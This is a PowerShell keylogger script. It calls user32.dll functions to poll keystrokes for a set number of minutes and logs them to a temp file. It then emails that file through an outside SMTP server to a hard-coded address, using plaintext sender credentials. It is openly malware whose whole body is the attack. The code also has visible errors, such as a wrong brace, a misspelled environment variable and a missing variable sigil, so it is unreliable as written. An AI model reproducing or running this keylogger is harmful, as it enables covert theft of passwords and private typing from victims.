$TimeTorun = 2
$From = "alirahmet52356@gmail.com"
$Pass = "123456789A!"
$To =  "hohoohh6@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.mail.com"
$SMTPPoRT = "857"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTO-SecureString -AsPlainText -Force)

$TimeStart = Get-Date
$TimeEnd = $timeStart.addminutes($TimeTorun)

function Start-Keylogger ($Path="$eny:temp\keylogger.txt")
( 
  $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState (int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState (byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode (uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@


  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
   
  $null = New-Item -Path $Path -ItemType File -Force 

  try
  {
    
    while ($TimeEnd - $TimeNow) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if (state -eq -32767) {
          $null = [console]::CapsLock

          $virtualKey = $API::MapVirtualKey($ascii, 3)
           
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          $mychar = New-Object -TypeName System.Text.StringBuilder
           
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          
          if ($success)
          {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
          }
        }
      } 
	  $TimeNow = Get-Date
	} 
  }  
  finally
  {
    send-mailmessage -from $from -to $to -subject $subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPoRT -credential $credentials -usessl
  }
}

Start-Keylogger